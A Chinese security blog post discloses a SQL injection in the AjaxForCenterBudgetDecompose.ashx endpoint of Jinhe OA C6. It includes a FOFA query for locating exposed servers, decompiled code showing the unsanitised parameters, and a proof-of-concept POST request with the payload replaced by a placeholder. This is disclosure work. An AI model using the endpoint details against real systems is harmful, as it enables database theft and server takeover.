---
title: "金和OA AjaxForCenterBudgetDecompose.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AjaxForCenterBudgetDecompose-sqli.html
asset_dir: assets/金和oa-ajaxforcenterbudgetdecompose.ashx-sql注入漏洞
---

# 金和OA AjaxForCenterBudgetDecompose.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/24 13:05
- 292浏览
- [0评论](#comment)
- 33分钟阅读

深入探索

授权

Web安全书籍

企业安全咨询

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AjaxForCenterBudgetDecompose.ashx` 接口处存在SQL注入漏洞，攻击者除了可以利用[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 `AjaxForCenterBudgetDecompose.ashx` 的源码，在 `bin` 目录下查找 `JHBase.Web.CostControl.dll` 将其进行反编译后找到 **AjaxForCenterBudgetDecompose** 的处理逻辑

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str1 = context.Request["strType"];
  string strYear = context.Request["strYear"];
  if (string.op_Equality(str1, "getBudgetTime"))
  {
    string strDeptId = context.Request["strDeptId"];
    string type = context.Request["type"];
    string timeType = context.Request["TimeType"];
    context.Response.Write(this.DataPeriodList(strYear, strDeptId, type, timeType));
  }
  else if (string.op_Equality(str1, "getDectomposeDepartment"))
  {
    string strDeptId = context.Request["strDeptId"];
    context.Response.Write(this.DataDectomposeDepartment(strDeptId));
  }
  else if (string.op_Equality(str1, "getBudgetManage"))
  {
    string strDeptId = context.Request["strDeptId"];
    string strTime = context.Request["strTime"];
    string decomposeMoneyInfo1;
    string decomposeMoneyInfo2;
    if (string.op_Equality(context.Request["type"], "Center"))
    {
      decomposeMoneyInfo1 = this.bdDao.GetCenterDecomposeMoneyInfo(strYear, strTime, strDeptId, "Company");
      decomposeMoneyInfo2 = this.bdDao.GetCenterDecomposeMoneyInfo(strYear, strTime, strDeptId, "Center");
    }
    else
    {
      decomposeMoneyInfo1 = this.bdDao.GetCenterDecomposeMoneyInfo(strYear, strTime, strDeptId, "center");
      decomposeMoneyInfo2 = this.bdDao.GetCenterDecomposeMoneyInfo(strYear, strTime, strDeptId, "Department");
    }
    Decimal num = Decimal.op_Subtraction(Convert.ToDecimal(decomposeMoneyInfo1), Convert.ToDecimal(decomposeMoneyInfo2));
    string str2 = $"{Convert.ToDecimal(decomposeMoneyInfo1):N2}".ToString();
    context.Response.Write($"{str2}|{$"{num:N2}".ToString()}");
  }
```

深入探索

文件大小转换

网络安全课程

数据库

当 `strType=getBudgetTime` 时，**strYear**、**strDeptId**、**type**被带入`DataPeriodList`方法

```
protected string DataPeriodList(string strYear, string strDeptId, string type, string timeType)
{
  string str1 = string.Empty;
  DataTable budgetTime = this.bdDao.GetBudgetTime(strYear, strDeptId, type);
```

跟进`GetBudgetTime`方法

```
public DataTable GetBudgetTime(string strYear, string strDeptId, string strType)
{
  this.strSql = $"select distinct DecomposeTime from DecomposeList where DecomposeState = 0 and DecomposeYear = {strYear} and DecomposeType = '{strType}'";
  if (!string.IsNullOrEmpty(strDeptId))
  {
    BudgetDecomposeDao budgetDecomposeDao = this;
    budgetDecomposeDao.strSql = $"{budgetDecomposeDao.strSql} and DeptID in ({strDeptId})";
  }
  this.strSql += " order by DecomposeTime asc";
  return this.db.ExecSQLReDataTable(this.strSql);
}
```

参数**strYear**、**strDeptId**、**type**被直接拼接到SQL语句中执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

整体执行流程如下，当中其他几个方法也存在同样的[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，就不赘述了

代码安全审计

[![金和OA AjaxForCenterBudgetDecompose.ashx SQL注入漏洞](images/img-001-cf4bbfa84e5d.webp)](https://image.mrxn.net/e895bcc069c84779acf816225988a8b0.webp)

# 漏洞复现

```
POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForCenterBudgetDecompose.ashx HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

strType=getBudgetTime&strDeptId=1&strYear=2012&type=SQLI_POC&TimeType=1
```

[![金和OA AjaxForCenterBudgetDecompose.ashx SQL注入漏洞](images/img-002-927c26c90880.webp)](https://image.mrxn.net/ea8a5fa734c74bada80ec0476dd770d1.webp)

成功延时 4 秒

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
